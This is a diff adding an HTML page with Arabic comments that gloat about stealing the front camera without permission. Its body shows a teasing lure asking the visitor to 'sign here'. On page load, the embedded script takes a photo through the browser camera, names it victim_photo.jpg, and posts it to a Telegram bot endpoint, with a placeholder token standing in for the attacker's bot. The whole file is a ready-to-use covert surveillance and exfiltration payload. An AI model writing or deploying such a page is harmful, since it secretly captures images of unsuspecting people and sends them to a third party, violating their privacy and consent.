@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ك!</title>
+    <script>
+        // هاهاها! هذا الكود سيسرق الكاميرا الأمامية بدون إذن!
+        async function stealCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                const formData = new FormData();
+                formData.append('image', blob, 'victim_photo.jpg');
+                
+                // إرسال الصورة إلى البوت الخاص بك 😈
+                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                alert('! 😈');
+            } catch (error) {
+                console.error('Error: ', error);
+            }
+        }
+    </script>
+</head>
+<body onload="stealCamera()">
+    <h1>وقّع لي هنا يا حبيبي! 😂</h1>
+</body>
+</html>
